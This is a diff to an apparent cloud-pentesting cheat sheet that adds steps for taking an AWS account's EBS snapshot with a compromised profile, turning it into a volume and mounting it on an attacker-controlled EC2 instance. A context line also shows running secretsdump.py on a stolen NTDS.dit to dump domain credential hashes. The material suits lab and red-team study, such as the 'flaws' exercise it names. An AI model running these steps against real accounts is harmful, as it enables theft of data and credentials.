@@ -73,6 +73,31 @@ aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west
 14. locally run `"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'`, expects secretsdump to be on path
 
 
+## Access Snapshots 
+
+1. Get the `owner-id`
+    ```powershell
+    $ aws --profile flaws sts get-caller-identity
+    "Account": "XXXX26262029",
+    ```
+2. List snapshots
+    ```powershell
+    $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
+    "SnapshotId": "snap-XXXX342abd1bdcb89",
+    ```
+3. Create a volume using the previously obtained `snapshotId`
+    ```powershell
+    $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+    ```
+4. In AWS console, deploy a new EC2 Ubuntu based, attach the volume and then mount it on the machine.
+    ```ps1
+    $ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
+    $ lsblk
+    $ sudo file -s /dev/xvda1
+    $ sudo mount /dev/xvda1 /mnt
+    ```
+
+
 ## Instance Connect
 
 Push an SSH key to EC2 instance
